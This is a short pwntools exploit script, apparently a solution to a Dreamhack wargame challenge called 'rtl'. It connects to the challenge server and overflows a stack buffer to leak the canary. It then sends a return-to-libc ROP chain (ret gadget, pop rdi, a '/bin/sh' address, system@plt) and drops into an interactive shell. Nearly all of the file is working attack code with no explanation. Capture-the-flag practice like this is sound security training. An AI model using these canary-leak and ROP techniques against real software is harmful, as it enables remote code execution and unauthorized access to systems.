from pwn import *

context.arch = 'amd64'

p = remote('host3.dreamhack.games', 23240)

elf = ELF('rtl')

system_plt = elf.plt['system']
#system_plt = 0x601028
payload = b'a'*0x38

p.send(payload+b'a')
p.recvuntil(payload+b'a')

canary = b'\x00' + p.recvn(7)
    
pop_rdi_ret_gadget = 0x0000000000400853
binish = 0x400874
ret_gadget = 0x0000000000400285

payload += canary + b'a'*0x8 + p64(ret_gadget) + p64(pop_rdi_ret_gadget) + p64(binish) + p64(system_plt)
# payload += canary + b'a'*0x8 + p64(pop_rdi_ret_gadget) + p64(binish) + p64(system_plt)

p.send(payload)

p.interactive()
